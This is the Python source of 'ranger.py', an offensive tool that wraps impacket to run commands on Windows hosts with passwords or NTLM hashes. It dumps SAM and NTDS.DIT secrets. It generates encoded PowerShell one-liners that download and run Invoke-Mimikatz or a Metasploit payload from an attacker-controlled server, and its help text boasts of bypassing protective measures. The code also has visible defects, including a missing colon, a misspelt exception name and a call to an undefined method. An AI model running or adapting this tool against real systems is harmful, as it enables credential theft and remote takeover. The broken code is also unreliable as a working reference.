#!/usr/bin/env python

'''
Author: Christopher Duffy
Date: July 2015
Name: ranger.py
Purpose: To encode commands that execute PowerShell scripts, also provides a wrapper for
some of the impacket examples and fixes relevant functionality

Copyright (c) 2015, Christopher Duffy All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met: * Redistributions
of source code must retain the above copyright notice, this list of conditions and
the following disclaimer. * Redistributions in binary form must reproduce the above
copyright notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution. * Neither the
name of the nor the names of its contributors may be used to endorse or promote
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL CHRISTOPHER DUFFY BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''
import base64, sys, argparse, re

try:
    import netifaces
except:
    sys.exit("[!] Install the netifaces library: pip install netifaces")
try:
    import psexec, smbexec, atexec
    import wmiexec as wmiexec
    import secretsdump
except Exception as e:
    print("[!] The following error occured %s") % (e)
    sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")

class Obfiscator:
    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, dst_ip="", dst_port=""):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.src_port = src_port
        self.payload = payload
        self.function = function
        self.argument = argument
        self.execution = execution
        self.methods = methods
        self.group = group
        self.command = ""
        try:
            self.run()
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def run(self):
        if "invoker" in self.execution:
            # Direct invoker
            self.invoker()
        elif "download" in self.execution:
            # Direct downloader
            self.downloader()
        elif "psexec" in self.execution:
            # Direct invoker via psexec
            self.invoker_psexec()
        elif "group" in self.execution:
            # Extract Group Members
            self.group_members()

    def packager(self, cleartext):
        encoded_utf = cleartext.encode('utf-16-le')
        encoded_base64 = base64.b64encode(encoded_utf)
        command = "powershell.exe -nop -enc %s" % (encoded_base64)
        return(command)

    def return_command(self):
        try:
            return(self.command)
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def invoker(self):
        # Invoke Mimikatz Directly
        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
        self.command = self.packager(text)

    def downloader(self):
        # Download String Directly
        text = "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://%s:%s/'))" % (str(self.src_ip), str(self.src_port))
        self.command = self.packager(text)

    def group_members(self):
        # Group Membership
        text = "Get-ADGroupMember -identity %s -Recursive | Get-ADUser -Property DisplayName | Select Name,ObjectClass,DisplayName" % (str(self.group))
        self.command = self.packager(text)

def get_interfaces():
    interfaces = netifaces.interfaces()
    return interfaces

def get_gateways():
    gateway_dict = {}
    gws = netifaces.gateways()
    for gw in gws:
        try:
            gateway_iface = gws[gw][netifaces.AF_INET]
            gateway_ip, iface = gateway_iface[0], gateway_iface[1]
            gw_list =[gateway_ip, iface]
            gateway_dict[gw]=gw_list
        except:
            pass
    return gateway_dict

def get_addresses(interface):
    addrs = netifaces.ifaddresses(interface)
    link_addr = addrs[netifaces.AF_LINK]
    iface_addrs = addrs[netifaces.AF_INET]
    iface_dict = iface_addrs[0]
    link_dict = link_addr[0]
    hwaddr = link_dict.get('addr')
    iface_addr = iface_dict.get('addr')
    iface_broadcast = iface_dict.get('broadcast')
    iface_netmask = iface_dict.get('netmask')
    return hwaddr, iface_addr, iface_broadcast, iface_netmask

def get_networks(gateways_dict):
    networks_dict = {}
    for key, value in gateways_dict.iteritems():
        gateway_ip, iface = value[0], value[1]
        hwaddress, addr, broadcast, netmask = get_addresses(iface)
        network = {'gateway': gateway_ip, 'hwaddr' : hwaddress, 'addr' : addr, 'broadcast' : broadcast, 'netmask' : netmask}
        networks_dict[iface] = network
    return networks_dict

def hash_test(LM, NTLM, pwd):
    print("[*] Hash detected")
    blank_ntlm = re.search(r'31d6cfe0d16ae931b73c59d7e0c089c0',NTLM, re.IGNORECASE)
    blank_lm = re.search(r'aad3b435b51404eeaad3b435b51404ee',LM, re.IGNORECASE)
    blank_lm_instances = len(re.findall(r'aad3b435b51404ee', LM, re.IGNORECASE))
    bad_format = re.search(r'NOPASSWORD',LM, re.IGNORECASE)
    if bad_format:
        print("[*] The hash was badly formatted, so padding it")
        LM = "aad3b435b51404eeaad3b435b51404ee"
    if blank_lm and blank_ntlm:
        print("[*] You do know this password is blank right?")
    elif blank_lm_instances == 1 and not blank_lm:
        print("[*] The hashed password is less than eight characters")
    elif blank_lm and blank_ntlm:
        print("[*] LM hashes are disabled, so focus on cracking the NTLM")
    hash = LM + ":" + NTLM
    print("[*] Your formated hash is: %s") % (hash)
    pwd = ""
    return(LM, NTLM, pwd, hash)


def main():
    # If script is executed at the CLI
    usage = '''
Command Shell:
    %(prog)s [-i IP] [--user Administrator] [--pwd Password1] [-t target] --smbexec -q -v -vv -vvv
Attack Directly:
    %(prog)s [-i IP] [--user Administrator] [--pwd Password1] [-t target] --wmiexec --invoker -q -v -vv -vvv
Create Pasteable Double Encoded Script:
    %(prog)s --invoker -q -v -vv -vvv
'''
    parser = argparse.ArgumentParser(usage=usage, description="A wrapping and execution tool for a some of the most useful impacket tools", epilog="This script oombines specific attacks with dynmaic methods, which allow you to bypass many protective measures.")
    group1 = parser.add_argument_group('Method')
    group2 = parser.add_argument_group('Attack')
    group3 = parser.add_argument_group('SAM and NTDS.DIT Options, used with --sam_dump')
    iex_options = parser.add_argument_group('PowerShell IEX Options')
    remote_attack = parser.add_argument_group('Remote Target Options')
    generator = parser.add_argument_group('Filename for randimization of script')
    method = group1.add_mutually_exclusive_group()
    attack = group2.add_mutually_exclusive_group()
    sam_dump_options = group3.add_mutually_exclusive_group()
    iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
    iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
    iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
    iex_options.add_argument("-x", action="store", dest="payload", default="Invoke-Mimikatz.ps1", help="The name of the Mimikatz file, the default is Invoke-Mimikatz.ps1")
    iex_options.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
    iex_options.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
    attack.add_argument("--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
    attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
    attack.add_argument("--secrets_dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
    attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
    attack.add_argument("--group-members", action="store", dest="group", help="Identifies members of Domain Groups through PowerShell")
    remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
    remote_attack.add_argument("--domain", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
    remote_attack.add_argument("--user", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
    remote_attack.add_argument("--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
    method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
    method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
    method.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
    method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the command task into the system memory with at on systems older than Vista")
    generator.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
    remote_attack.add_argument("--aes", action="store", dest="aes_key", default=None, help="The AES Key Option")
    remote_attack.add_argument("--kerberos", action="store", dest="kerberos", default=False, help="The Kerberos option")
    remote_attack.add_argument("--share", action="store", default="ADMIN$", dest="share", help="The Share to execute against, the default is ADMIN$")
    remote_attack.add_argument('--mode', action="store", dest="mode", choices={"SERVER","SHARE"}, default="SERVER", help="Mode to use for --smbexec, default is SERVER, which requires root access, SHARE does not")
    remote_attack.add_argument("--protocol", action="store", dest="protocol", choices={"445/SMB","139/SMB"}, default="445/SMB", help="The protocol to attack over, the default is 445/SMB")
    remote_attack.add_argument("--directory", action="store", dest="directory", default="C:\\", help="The directory to either drop the payload or instantiate the session")
    sam_dump_options.add_argument("--system", action="store", help="The SYSTEM hive to parse")
    sam_dump_options.add_argument("--security", action="store", help="The SECURITY hive to parse")
    sam_dump_options.add_argument("--sam", action="store", help="The SAM hive to parse")
    sam_dump_options.add_argument("--ntds", action="store", help="The NTDS.DIT file to parse")
    parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
    parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
    parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
    args = parser.parse_args()

    # Argument Validator
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    # Set Constructors
    verbose = args.verbose             # Verbosity level
    src_port = args.src_port           # Port to source the Mimikatz script on
    src_ip = args.src_ip               # IP to source the Mimikatz script on
    payload = args.payload             # The name of the payload that will be used
    interface = args.interface         # The interface to grab the IP from
    mim_func = args.mim_func           # The function that is executed
    mim_arg = args.mim_arg             # The argument processed by the function
    invoker = args.invoker             # Holds the results for invoker execution
    downloader = args.downloader       # Holds the results for exploit/multi/script/web_delivery
    smbexec_cmd = args.smbexec_cmd     # Holds the results for smbexec execution
    wmiexec_cmd = args.wmiexec_cmd     # Holds the results for the wmiexec execution
    psexec_cmd = args.psexec_cmd       # Holds the results for the psexec execution
    atexec_cmd = args.atexec_cmd
    aes = args.aes_key
    kerberos = args.kerberos
    share = args.share
    protocol = args.protocol
    directory = args.directory
    usr = args.usr
    pwd = args.pwd
    dom = args.dom
    target = args.target
    command = args.command
    filename = args.filename
    sam_dump = args.sam_dump
    mode = args.mode.upper()
    system = args.system
    security = args.security
    sam = args.sam
    ntds = args.ntds
    group = args.group
    LM = ""
    NTLM = ""
    no_output = False
    execution = ""
    supplement = ""
    hash = None
    methods = False
    method_dict = {}

    if aes != None:
        kerberos = True

    if filename:
        payload = filename

    if smbexec_cmd or wmiexec_cmd or psexec_cmd or atexec_cmd:
        methods = True

    if invoker and payload == None and methods == False:
        print("[!] This script requires either a command, an invoker attack, or a downloader attack")
        parser.print_help()
        sys.exit(1)
    if pwd and ":" in pwd and pwd.count(':') == 6:
        pwdump_format_hash = pwd.split(':')
        if not usr:
            usr = pwdump_format_hash[0].lower()
        SID = pwdump_format_hash[1]
        LM = pwdump_format_hash[2]
        NTLM = pwdump_format_hash[3]
    if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
        LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd)
    if pwd and ":" in pwd and pwd.count(':') == 1:
        if pwd.startswith(':'):
            LM, NTLM = pwd.split(':')
            if LM == "":
                LM = "aad3b435b51404eeaad3b435b51404ee"
        else:
            LM, NTLM = pwd.split(':')
        if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
            LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd)

    if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd or sam_dump:
        method_dict = {"smbexec" : smbexec_cmd, "wmiexec" : wmiexec_cmd, "atexec" : atexec_cmd, "psexec" : psexec_cmd}
        if usr == None or pwd == None:
            print(2)
            sys.exit("[!] If you are trying to exploit a system you need a username and password")
        if target == None:
            print(1)
            sys.exit("[!] If you are trying to exploit a system you need at least one target")

    gateways = get_gateways()
    network_ifaces = get_networks(gateways)
    if src_ip == None:
        try:
           src_ip = network_ifaces[interface]['addr']
        except Exception as e:
            print("[!] No IP address found on interface %s") % (interface)

    if invoker:
        execution = "invoker"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
        command = x.return_command()
    if downloader:
        execution = "downloader"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
        command = x.return_command()
    elif psexec_cmd and invoker:
        execution = "psexec"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
        command = x.return_command()
    elif group:
        execution = "group"
        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
        command = x.return_command()

    if "invoker" in execution and not wmiexec_cmd:
        supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
[*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
    elif "downloader" in execution and not wmiexec_cmd:
        supplement = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
[*] Make sure to select the PowerShell and copy the payload name for this script and set the URIPATH to /.'''
    elif "group" in execution and not wmiexec_cmd:
        supplement = '''[*] This script will identify Members of the Group: ''' + group + ''' with PowerShell.'''
    instructions = supplement + '''
[*] Then copy and paste the following command into the target boxes command shell.
[*] This execution script is double encoded.
'''

    if psexec_cmd:
        if pwd != "":
            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
        else:
            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
        attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
        attack.run(target)
    elif wmiexec_cmd:
        if hash:
            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
        else:
            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
        if command == "cmd.exe"
            sys.exit("[!] You must provide a command or method of exploitation if you are using wmiexec")
        attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
        attack.run(target)
    elif smbexec_cmd:
        if hash:
            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
        else:
            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
        attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
        attack.run(target)
    elif atexec_cmd:
        if hash:
            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
        else:
            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
        if command == "cmd.exe":
            sys.exit("[!] Please provide a viable command for execution")
        attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
        attack.play(target)
    elif sam_dump:
        if hash:
            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
        else:
            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
        attack=secretsdump.DumpSecrets(address = target, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
        try:
            attack.dump()
        except Execption as e:
            print("[!] An error occured during execution")
    else:
        print(instructions)
        print(x.return_command())

if __name__ == '__main__':
    main()
